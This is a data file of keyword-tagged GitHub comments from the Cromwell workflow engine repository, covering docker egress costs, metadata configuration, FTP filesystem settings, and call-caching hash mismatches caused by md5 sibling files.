https://github.com/broadinstitute/cromwell/issues/6235#issuecomment-814160702:109,Testability,test,testing,109,"I honestly have not really pulled docker images without Cromwell before, other than on my laptop for minimal testing. If I try to pull a docker manually I do get the same error, as you suggested, even if the Google VM and the GCR bucket are both running on the same Google Cloud network. Isn't this a bad design from Google though? How do I make my dockers available for my WDLs and on Terra while at the same time preventing actors running the same WDLs in Google Clouds in other continents from forcing me to incur egress charges? I must be missing something. I see two possible alternative partial solutions for this issue:. (i) is there a way to write a WDL so that it automatically detects whether it should use `us.gcr.io`, or `eu.gcr.io` or `asia.gcr.io` and so that it would automatically select the one that is closer (and free)? I suppose not, as this would be outside the specification of WDL. Curios what you think though. (ii) is there a way to prevent Cromwell running with PAPIv2 from having to pull a docker image multiple time? I wrote WDLs that run on large cohorts (biobank size) and they can scatter task arrays with ~1,000 shards. If this resulted in pulling a docker once, absorbing the cost would likely still be scalable, but as it is now it is very inefficient and it makes the cost of running the WDL almost dominated by the pulling of the dockers if egress costs are involved. [Notice also that someone from the VA run my WDL but I think that, since the computation was performed on an LSF HPC cluster, the docker image was pulled only once and then reused within the LSF HPC cluster, as I did not notice any significant egress costs when this happened]. @cjllanwarne thank you for reaching out to Google. I hope this spurs a broader discussion. I am not in urgent need for a fix, but I very much hope a solution is available in the long term.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6235#issuecomment-814160702
https://github.com/broadinstitute/cromwell/issues/6235#issuecomment-884262789:105,Energy Efficiency,charge,charge,105,"Has there been any further discussion about this issue? Our team was also recently hit by a large egress charge for inter-continent docker image pulls by Cromwell -- we'd really like to be able set our image repositories to requester-pays to prevent that. . Having Cromwell/PAPI cache images would also really help to mitigate the problem -- similarly to @freeseek our workflow is structured to scatter some steps quite widely, so one relatively small workflow run can currently result in hundreds of docker pulls of the same image.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6235#issuecomment-884262789
https://github.com/broadinstitute/cromwell/issues/6235#issuecomment-884262789:279,Performance,cache,cache,279,"Has there been any further discussion about this issue? Our team was also recently hit by a large egress charge for inter-continent docker image pulls by Cromwell -- we'd really like to be able set our image repositories to requester-pays to prevent that. . Having Cromwell/PAPI cache images would also really help to mitigate the problem -- similarly to @freeseek our workflow is structured to scatter some steps quite widely, so one relatively small workflow run can currently result in hundreds of docker pulls of the same image.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6235#issuecomment-884262789
https://github.com/broadinstitute/cromwell/issues/6235#issuecomment-884342364:481,Availability,down,download,481,"@aednichols I agree with your point regarding Google. However, I feel like there is a huge conflict of interest here: how can Google motivate itself to fix something that could potentially allow them to make a lot of money? How does Google suggest users should fix this problem? It seems a huge financial risk to include docker images in `us.gcr.io`, `eu.gcr.io`, and `asia.gcr.io` as the corresponding buckets need to be public and cannot be set as Requester Pays, so anybody can download them at will. Do you have advice for how to best reach out to them to advocate for this?. Replicating images across regions is currently not very sustainable as it would rely on users' good will and understanding of this complicated problem, as Cromwell does not have a framework to automatically understand within a workflow which docker images it should pull. If Google does not get their act together, I suppose that ultimately the Cromwell team has to come to terms with the fact that the `us.gcr.io`, `eu.gcr.io`, and `asia.gcr.io` repository solutions are not sustainable and an alternative will need to be engineered and provided to those writing WDL pipelines. Not sure what the easiest solution would be though. Cromwell currently has some framework for dealing deferentially with Files with optional localization when a WDL is run on Google Cloud. Could something be included in Cromwell to allow the WDL to know in which Google cloud the tasks are being run so that at least the best repository could be automatically selected?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6235#issuecomment-884342364
https://github.com/broadinstitute/cromwell/issues/6235#issuecomment-884342364:1148,Deployability,pipeline,pipelines,1148,"@aednichols I agree with your point regarding Google. However, I feel like there is a huge conflict of interest here: how can Google motivate itself to fix something that could potentially allow them to make a lot of money? How does Google suggest users should fix this problem? It seems a huge financial risk to include docker images in `us.gcr.io`, `eu.gcr.io`, and `asia.gcr.io` as the corresponding buckets need to be public and cannot be set as Requester Pays, so anybody can download them at will. Do you have advice for how to best reach out to them to advocate for this?. Replicating images across regions is currently not very sustainable as it would rely on users' good will and understanding of this complicated problem, as Cromwell does not have a framework to automatically understand within a workflow which docker images it should pull. If Google does not get their act together, I suppose that ultimately the Cromwell team has to come to terms with the fact that the `us.gcr.io`, `eu.gcr.io`, and `asia.gcr.io` repository solutions are not sustainable and an alternative will need to be engineered and provided to those writing WDL pipelines. Not sure what the easiest solution would be though. Cromwell currently has some framework for dealing deferentially with Files with optional localization when a WDL is run on Google Cloud. Could something be included in Cromwell to allow the WDL to know in which Google cloud the tasks are being run so that at least the best repository could be automatically selected?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6235#issuecomment-884342364
https://github.com/broadinstitute/cromwell/issues/6235#issuecomment-884342364:636,Energy Efficiency,sustainab,sustainable,636,"@aednichols I agree with your point regarding Google. However, I feel like there is a huge conflict of interest here: how can Google motivate itself to fix something that could potentially allow them to make a lot of money? How does Google suggest users should fix this problem? It seems a huge financial risk to include docker images in `us.gcr.io`, `eu.gcr.io`, and `asia.gcr.io` as the corresponding buckets need to be public and cannot be set as Requester Pays, so anybody can download them at will. Do you have advice for how to best reach out to them to advocate for this?. Replicating images across regions is currently not very sustainable as it would rely on users' good will and understanding of this complicated problem, as Cromwell does not have a framework to automatically understand within a workflow which docker images it should pull. If Google does not get their act together, I suppose that ultimately the Cromwell team has to come to terms with the fact that the `us.gcr.io`, `eu.gcr.io`, and `asia.gcr.io` repository solutions are not sustainable and an alternative will need to be engineered and provided to those writing WDL pipelines. Not sure what the easiest solution would be though. Cromwell currently has some framework for dealing deferentially with Files with optional localization when a WDL is run on Google Cloud. Could something be included in Cromwell to allow the WDL to know in which Google cloud the tasks are being run so that at least the best repository could be automatically selected?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6235#issuecomment-884342364
https://github.com/broadinstitute/cromwell/issues/6235#issuecomment-884342364:1056,Energy Efficiency,sustainab,sustainable,1056,"@aednichols I agree with your point regarding Google. However, I feel like there is a huge conflict of interest here: how can Google motivate itself to fix something that could potentially allow them to make a lot of money? How does Google suggest users should fix this problem? It seems a huge financial risk to include docker images in `us.gcr.io`, `eu.gcr.io`, and `asia.gcr.io` as the corresponding buckets need to be public and cannot be set as Requester Pays, so anybody can download them at will. Do you have advice for how to best reach out to them to advocate for this?. Replicating images across regions is currently not very sustainable as it would rely on users' good will and understanding of this complicated problem, as Cromwell does not have a framework to automatically understand within a workflow which docker images it should pull. If Google does not get their act together, I suppose that ultimately the Cromwell team has to come to terms with the fact that the `us.gcr.io`, `eu.gcr.io`, and `asia.gcr.io` repository solutions are not sustainable and an alternative will need to be engineered and provided to those writing WDL pipelines. Not sure what the easiest solution would be though. Cromwell currently has some framework for dealing deferentially with Files with optional localization when a WDL is run on Google Cloud. Could something be included in Cromwell to allow the WDL to know in which Google cloud the tasks are being run so that at least the best repository could be automatically selected?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6235#issuecomment-884342364
https://github.com/broadinstitute/cromwell/issues/6235#issuecomment-884342364:305,Safety,risk,risk,305,"@aednichols I agree with your point regarding Google. However, I feel like there is a huge conflict of interest here: how can Google motivate itself to fix something that could potentially allow them to make a lot of money? How does Google suggest users should fix this problem? It seems a huge financial risk to include docker images in `us.gcr.io`, `eu.gcr.io`, and `asia.gcr.io` as the corresponding buckets need to be public and cannot be set as Requester Pays, so anybody can download them at will. Do you have advice for how to best reach out to them to advocate for this?. Replicating images across regions is currently not very sustainable as it would rely on users' good will and understanding of this complicated problem, as Cromwell does not have a framework to automatically understand within a workflow which docker images it should pull. If Google does not get their act together, I suppose that ultimately the Cromwell team has to come to terms with the fact that the `us.gcr.io`, `eu.gcr.io`, and `asia.gcr.io` repository solutions are not sustainable and an alternative will need to be engineered and provided to those writing WDL pipelines. Not sure what the easiest solution would be though. Cromwell currently has some framework for dealing deferentially with Files with optional localization when a WDL is run on Google Cloud. Could something be included in Cromwell to allow the WDL to know in which Google cloud the tasks are being run so that at least the best repository could be automatically selected?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6235#issuecomment-884342364
https://github.com/broadinstitute/cromwell/issues/6235#issuecomment-884347729:280,Integrability,depend,dependent,280,"We can't really make our images private because we want our workflows to be publicly accessible, especially for Terra users. We can make mirrors of our GCR image repositories across regions -- hopefully that will eliminate this type of event for the most part. But we'll still be dependent on our users to to use the right mirrors (as @freeseek just noted above).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6235#issuecomment-884347729
https://github.com/broadinstitute/cromwell/issues/6235#issuecomment-884347729:85,Security,access,accessible,85,"We can't really make our images private because we want our workflows to be publicly accessible, especially for Terra users. We can make mirrors of our GCR image repositories across regions -- hopefully that will eliminate this type of event for the most part. But we'll still be dependent on our users to to use the right mirrors (as @freeseek just noted above).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6235#issuecomment-884347729
https://github.com/broadinstitute/cromwell/issues/6236#issuecomment-813646650:80,Modifiability,variab,variable,80,"A collaborator from DSP had pointed me to increasing the option by changing the variable:; ```services.MetadataService.config.metadata-read-row-number-safety-threshold = 1000000```; and then, after Googling it, I did see that example. But I could not find an explanation of that variable in the documentation. :-)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6236#issuecomment-813646650
https://github.com/broadinstitute/cromwell/issues/6236#issuecomment-813646650:119,Modifiability,config,config,119,"A collaborator from DSP had pointed me to increasing the option by changing the variable:; ```services.MetadataService.config.metadata-read-row-number-safety-threshold = 1000000```; and then, after Googling it, I did see that example. But I could not find an explanation of that variable in the documentation. :-)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6236#issuecomment-813646650
https://github.com/broadinstitute/cromwell/issues/6236#issuecomment-813646650:279,Modifiability,variab,variable,279,"A collaborator from DSP had pointed me to increasing the option by changing the variable:; ```services.MetadataService.config.metadata-read-row-number-safety-threshold = 1000000```; and then, after Googling it, I did see that example. But I could not find an explanation of that variable in the documentation. :-)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6236#issuecomment-813646650
https://github.com/broadinstitute/cromwell/issues/6236#issuecomment-813646650:151,Safety,safe,safety-threshold,151,"A collaborator from DSP had pointed me to increasing the option by changing the variable:; ```services.MetadataService.config.metadata-read-row-number-safety-threshold = 1000000```; and then, after Googling it, I did see that example. But I could not find an explanation of that variable in the documentation. :-)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6236#issuecomment-813646650
https://github.com/broadinstitute/cromwell/issues/6237#issuecomment-810693392:105,Deployability,configurat,configuration,105,"As explained [here](https://cromwell.readthedocs.io/en/stable/filesystems/FileTransferProtocol/#instance-configuration), you will need an ftp stanza inside your backend or engine filesystem stanza such as this (look at the example as well):; ```; ftp {; # optional; auth {; username = ""username""; password = ""password""; # Optional; account = ""account""; }; }; ```; I suppose you might leave the fto stanza empty without the optional parts, but maybe you still need it nevertheless. Remember also that the engine filesystem stanza is for Cromwell to be able to access the files with functions such as `read_lines()/read_map()/read_tsv()/read_json()/write_lines()/write_map()/write_tsv()/write_json()/etc.`, while the backend filesystem stanza is for the tasks to be able to access and localize files.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6237#issuecomment-810693392
https://github.com/broadinstitute/cromwell/issues/6237#issuecomment-810693392:105,Modifiability,config,configuration,105,"As explained [here](https://cromwell.readthedocs.io/en/stable/filesystems/FileTransferProtocol/#instance-configuration), you will need an ftp stanza inside your backend or engine filesystem stanza such as this (look at the example as well):; ```; ftp {; # optional; auth {; username = ""username""; password = ""password""; # Optional; account = ""account""; }; }; ```; I suppose you might leave the fto stanza empty without the optional parts, but maybe you still need it nevertheless. Remember also that the engine filesystem stanza is for Cromwell to be able to access the files with functions such as `read_lines()/read_map()/read_tsv()/read_json()/write_lines()/write_map()/write_tsv()/write_json()/etc.`, while the backend filesystem stanza is for the tasks to be able to access and localize files.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6237#issuecomment-810693392
https://github.com/broadinstitute/cromwell/issues/6237#issuecomment-810693392:297,Security,password,password,297,"As explained [here](https://cromwell.readthedocs.io/en/stable/filesystems/FileTransferProtocol/#instance-configuration), you will need an ftp stanza inside your backend or engine filesystem stanza such as this (look at the example as well):; ```; ftp {; # optional; auth {; username = ""username""; password = ""password""; # Optional; account = ""account""; }; }; ```; I suppose you might leave the fto stanza empty without the optional parts, but maybe you still need it nevertheless. Remember also that the engine filesystem stanza is for Cromwell to be able to access the files with functions such as `read_lines()/read_map()/read_tsv()/read_json()/write_lines()/write_map()/write_tsv()/write_json()/etc.`, while the backend filesystem stanza is for the tasks to be able to access and localize files.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6237#issuecomment-810693392
https://github.com/broadinstitute/cromwell/issues/6237#issuecomment-810693392:309,Security,password,password,309,"As explained [here](https://cromwell.readthedocs.io/en/stable/filesystems/FileTransferProtocol/#instance-configuration), you will need an ftp stanza inside your backend or engine filesystem stanza such as this (look at the example as well):; ```; ftp {; # optional; auth {; username = ""username""; password = ""password""; # Optional; account = ""account""; }; }; ```; I suppose you might leave the fto stanza empty without the optional parts, but maybe you still need it nevertheless. Remember also that the engine filesystem stanza is for Cromwell to be able to access the files with functions such as `read_lines()/read_map()/read_tsv()/read_json()/write_lines()/write_map()/write_tsv()/write_json()/etc.`, while the backend filesystem stanza is for the tasks to be able to access and localize files.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6237#issuecomment-810693392
https://github.com/broadinstitute/cromwell/issues/6237#issuecomment-810693392:559,Security,access,access,559,"As explained [here](https://cromwell.readthedocs.io/en/stable/filesystems/FileTransferProtocol/#instance-configuration), you will need an ftp stanza inside your backend or engine filesystem stanza such as this (look at the example as well):; ```; ftp {; # optional; auth {; username = ""username""; password = ""password""; # Optional; account = ""account""; }; }; ```; I suppose you might leave the fto stanza empty without the optional parts, but maybe you still need it nevertheless. Remember also that the engine filesystem stanza is for Cromwell to be able to access the files with functions such as `read_lines()/read_map()/read_tsv()/read_json()/write_lines()/write_map()/write_tsv()/write_json()/etc.`, while the backend filesystem stanza is for the tasks to be able to access and localize files.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6237#issuecomment-810693392
https://github.com/broadinstitute/cromwell/issues/6237#issuecomment-810693392:772,Security,access,access,772,"As explained [here](https://cromwell.readthedocs.io/en/stable/filesystems/FileTransferProtocol/#instance-configuration), you will need an ftp stanza inside your backend or engine filesystem stanza such as this (look at the example as well):; ```; ftp {; # optional; auth {; username = ""username""; password = ""password""; # Optional; account = ""account""; }; }; ```; I suppose you might leave the fto stanza empty without the optional parts, but maybe you still need it nevertheless. Remember also that the engine filesystem stanza is for Cromwell to be able to access the files with functions such as `read_lines()/read_map()/read_tsv()/read_json()/write_lines()/write_map()/write_tsv()/write_json()/etc.`, while the backend filesystem stanza is for the tasks to be able to access and localize files.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6237#issuecomment-810693392
https://github.com/broadinstitute/cromwell/pull/6284#issuecomment-811942261:10,Testability,test,tests,10,Bypassing tests and codecoverage because this is not production code.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6284#issuecomment-811942261
https://github.com/broadinstitute/cromwell/issues/6301#issuecomment-1102921870:0,Testability,Test,Testing,0,Testing GenericS3 support in #6737,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6301#issuecomment-1102921870
https://github.com/broadinstitute/cromwell/pull/6304#issuecomment-816861697:42,Modifiability,config,config,42,Ignoring travis CI in this case. This IDE config file has no impact on production code.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6304#issuecomment-816861697
https://github.com/broadinstitute/cromwell/issues/6306#issuecomment-820729118:31,Availability,error,error,31,"According to the [list of PAPI error codes](https://cloud.google.com/life-sciences/docs/troubleshooting#unavailable_14), `14` is indeed preemption so I agree that is surprising on a non-preemptible. You can use Cromwell retries to re-run; or reach out to your GCP support venue to better understand what's going on.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6306#issuecomment-820729118
https://github.com/broadinstitute/cromwell/pull/6312#issuecomment-827658854:35,Deployability,release,release,35,Merge to develop gated on a BT-219 release of Martha that supports access urls.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6312#issuecomment-827658854
https://github.com/broadinstitute/cromwell/pull/6312#issuecomment-827658854:67,Security,access,access,67,Merge to develop gated on a BT-219 release of Martha that supports access urls.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6312#issuecomment-827658854
https://github.com/broadinstitute/cromwell/pull/6314#issuecomment-819743136:144,Availability,error,errors,144,"@aednichols and @rsasch - yes, `Integer.MIN_VALUE` is some huge negative value. I tested with a fetchSize of ""1"" and got the same out of memory errors as when it was 1000. I don't know whether `Integer.MIN_VALUE` is a special sentinel value or any value below 0 would do.... but since it works, I'm inclined to treat it as a magic number, and document it as such.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6314#issuecomment-819743136
https://github.com/broadinstitute/cromwell/pull/6314#issuecomment-819743136:82,Testability,test,tested,82,"@aednichols and @rsasch - yes, `Integer.MIN_VALUE` is some huge negative value. I tested with a fetchSize of ""1"" and got the same out of memory errors as when it was 1000. I don't know whether `Integer.MIN_VALUE` is a special sentinel value or any value below 0 would do.... but since it works, I'm inclined to treat it as a magic number, and document it as such.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6314#issuecomment-819743136
https://github.com/broadinstitute/cromwell/issues/6316#issuecomment-823638176:27,Performance,cache,cache,27,I recommend using the call cache diff endpoint; ```; GET ​/api​/workflows​/v1/callcaching​/diff; ```. > This endpoint returns the hash differences between 2 completed (successfully or not) calls.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6316#issuecomment-823638176
https://github.com/broadinstitute/cromwell/issues/6316#issuecomment-823638176:130,Security,hash,hash,130,I recommend using the call cache diff endpoint; ```; GET ​/api​/workflows​/v1/callcaching​/diff; ```. > This endpoint returns the hash differences between 2 completed (successfully or not) calls.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6316#issuecomment-823638176
https://github.com/broadinstitute/cromwell/issues/6316#issuecomment-823727881:29,Performance,cache,cache,29,"> I recommend using the call cache diff endpoint; > ; > ```; > GET ​/api​/workflows​/v1/callcaching​/diff; > ```; > ; > > This endpoint returns the hash differences between 2 completed (successfully or not) calls. Thank you, i will try it",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6316#issuecomment-823727881
https://github.com/broadinstitute/cromwell/issues/6316#issuecomment-823727881:148,Security,hash,hash,148,"> I recommend using the call cache diff endpoint; > ; > ```; > GET ​/api​/workflows​/v1/callcaching​/diff; > ```; > ; > > This endpoint returns the hash differences between 2 completed (successfully or not) calls. Thank you, i will try it",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6316#issuecomment-823727881
https://github.com/broadinstitute/cromwell/issues/6316#issuecomment-824659689:445,Performance,cache,cache,445,"I tried the `GET ​/api​/workflows​/v1/callcaching​/diff`, but it didn't seam to work, and something wrong in Array..... I compared the ""callCaching"" of the same task between two workflows, all of them is the same except the red box :; ![image](https://user-images.githubusercontent.com/70520563/115682260-dedefc00-a387-11eb-8164-f21830f1c4a6.png); md5 values are the same, but the following paths are different. Therefore, I guess the reason of cache miss hit is caused by ""md5+path""; And Who knows how to remove path from MD5 value ?. I've tried many ways, but I don't know how to get rid of path in MD5 value. ; Who can help me please !",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6316#issuecomment-824659689
https://github.com/broadinstitute/cromwell/issues/6316#issuecomment-826572592:106,Modifiability,config,config,106,"Finally, I found out why the MD5 value contains the file path. I Hope it can help others:. ### The server config:; `check-sibling-md5 : true`; When true, will check if a sibling file with the same name and the .md5 extension exists, and if it does, use the content of this file as a hash.; So i checked the metadata, i found all of hash with file path records is connecting with md5 task, the task command :; ```; command <<<; md5sum ~{inputfile} > ~{inputfile.md5}; >>>; ```; : ( that is a stupid mistakes, right? ; 1. The `inputfile` is a file with whole path, so the md5 task will generate a hash with path like ""b882eaf8272a52d3eea851d74a6b4aec /path/sample.final.bam"", and write to the file `inputfile.md5`. ; 2. The cromwell server will find the `inputfile` sbling md5 with the name `inputfile.md5`, which contains hash with path. So the callcaching in metadata records it.; 3. The next workflow will not hit cache because the file path are different",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6316#issuecomment-826572592
https://github.com/broadinstitute/cromwell/issues/6316#issuecomment-826572592:915,Performance,cache,cache,915,"Finally, I found out why the MD5 value contains the file path. I Hope it can help others:. ### The server config:; `check-sibling-md5 : true`; When true, will check if a sibling file with the same name and the .md5 extension exists, and if it does, use the content of this file as a hash.; So i checked the metadata, i found all of hash with file path records is connecting with md5 task, the task command :; ```; command <<<; md5sum ~{inputfile} > ~{inputfile.md5}; >>>; ```; : ( that is a stupid mistakes, right? ; 1. The `inputfile` is a file with whole path, so the md5 task will generate a hash with path like ""b882eaf8272a52d3eea851d74a6b4aec /path/sample.final.bam"", and write to the file `inputfile.md5`. ; 2. The cromwell server will find the `inputfile` sbling md5 with the name `inputfile.md5`, which contains hash with path. So the callcaching in metadata records it.; 3. The next workflow will not hit cache because the file path are different",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6316#issuecomment-826572592
https://github.com/broadinstitute/cromwell/issues/6316#issuecomment-826572592:283,Security,hash,hash,283,"Finally, I found out why the MD5 value contains the file path. I Hope it can help others:. ### The server config:; `check-sibling-md5 : true`; When true, will check if a sibling file with the same name and the .md5 extension exists, and if it does, use the content of this file as a hash.; So i checked the metadata, i found all of hash with file path records is connecting with md5 task, the task command :; ```; command <<<; md5sum ~{inputfile} > ~{inputfile.md5}; >>>; ```; : ( that is a stupid mistakes, right? ; 1. The `inputfile` is a file with whole path, so the md5 task will generate a hash with path like ""b882eaf8272a52d3eea851d74a6b4aec /path/sample.final.bam"", and write to the file `inputfile.md5`. ; 2. The cromwell server will find the `inputfile` sbling md5 with the name `inputfile.md5`, which contains hash with path. So the callcaching in metadata records it.; 3. The next workflow will not hit cache because the file path are different",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6316#issuecomment-826572592
https://github.com/broadinstitute/cromwell/issues/6316#issuecomment-826572592:332,Security,hash,hash,332,"Finally, I found out why the MD5 value contains the file path. I Hope it can help others:. ### The server config:; `check-sibling-md5 : true`; When true, will check if a sibling file with the same name and the .md5 extension exists, and if it does, use the content of this file as a hash.; So i checked the metadata, i found all of hash with file path records is connecting with md5 task, the task command :; ```; command <<<; md5sum ~{inputfile} > ~{inputfile.md5}; >>>; ```; : ( that is a stupid mistakes, right? ; 1. The `inputfile` is a file with whole path, so the md5 task will generate a hash with path like ""b882eaf8272a52d3eea851d74a6b4aec /path/sample.final.bam"", and write to the file `inputfile.md5`. ; 2. The cromwell server will find the `inputfile` sbling md5 with the name `inputfile.md5`, which contains hash with path. So the callcaching in metadata records it.; 3. The next workflow will not hit cache because the file path are different",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6316#issuecomment-826572592
https://github.com/broadinstitute/cromwell/issues/6316#issuecomment-826572592:595,Security,hash,hash,595,"Finally, I found out why the MD5 value contains the file path. I Hope it can help others:. ### The server config:; `check-sibling-md5 : true`; When true, will check if a sibling file with the same name and the .md5 extension exists, and if it does, use the content of this file as a hash.; So i checked the metadata, i found all of hash with file path records is connecting with md5 task, the task command :; ```; command <<<; md5sum ~{inputfile} > ~{inputfile.md5}; >>>; ```; : ( that is a stupid mistakes, right? ; 1. The `inputfile` is a file with whole path, so the md5 task will generate a hash with path like ""b882eaf8272a52d3eea851d74a6b4aec /path/sample.final.bam"", and write to the file `inputfile.md5`. ; 2. The cromwell server will find the `inputfile` sbling md5 with the name `inputfile.md5`, which contains hash with path. So the callcaching in metadata records it.; 3. The next workflow will not hit cache because the file path are different",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6316#issuecomment-826572592
https://github.com/broadinstitute/cromwell/issues/6316#issuecomment-826572592:821,Security,hash,hash,821,"Finally, I found out why the MD5 value contains the file path. I Hope it can help others:. ### The server config:; `check-sibling-md5 : true`; When true, will check if a sibling file with the same name and the .md5 extension exists, and if it does, use the content of this file as a hash.; So i checked the metadata, i found all of hash with file path records is connecting with md5 task, the task command :; ```; command <<<; md5sum ~{inputfile} > ~{inputfile.md5}; >>>; ```; : ( that is a stupid mistakes, right? ; 1. The `inputfile` is a file with whole path, so the md5 task will generate a hash with path like ""b882eaf8272a52d3eea851d74a6b4aec /path/sample.final.bam"", and write to the file `inputfile.md5`. ; 2. The cromwell server will find the `inputfile` sbling md5 with the name `inputfile.md5`, which contains hash with path. So the callcaching in metadata records it.; 3. The next workflow will not hit cache because the file path are different",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6316#issuecomment-826572592
https://github.com/broadinstitute/cromwell/issues/6316#issuecomment-838031656:185,Modifiability,config,config,185,"> Huh, I wonder how that got set to `true` for you. It appears to default to `false` in all the code and documentation I could find. I am just one of the Server user. The admin set the config of cromwell server ,and others submit the jobs to the server, so I met this problem",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6316#issuecomment-838031656
https://github.com/broadinstitute/cromwell/pull/6318#issuecomment-828598501:421,Availability,failure,failure,421,"@cjllanwarne Would it make sense to send a `0L` metric for `workflowArchiveTotalTimeFailureMetricPath` in [Success cases here](https://github.com/broadinstitute/cromwell/blob/80cfe3e4b653c5ab6f2f935c9b306b34cd4287c9/services/src/main/scala/cromwell/services/metadata/impl/archiver/ArchiveMetadataSchedulerActor.scala#L77-L99) so that the graph line can come back to 0 upon a success in the below graph? Currently after a failure metric, it stays at the x seconds and never comes back down. ![Screen Shot 2021-04-28 at 12 28 15 PM](https://user-images.githubusercontent.com/16748522/116439527-a757d000-a81d-11eb-8b2e-1d4238aab769.png)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6318#issuecomment-828598501
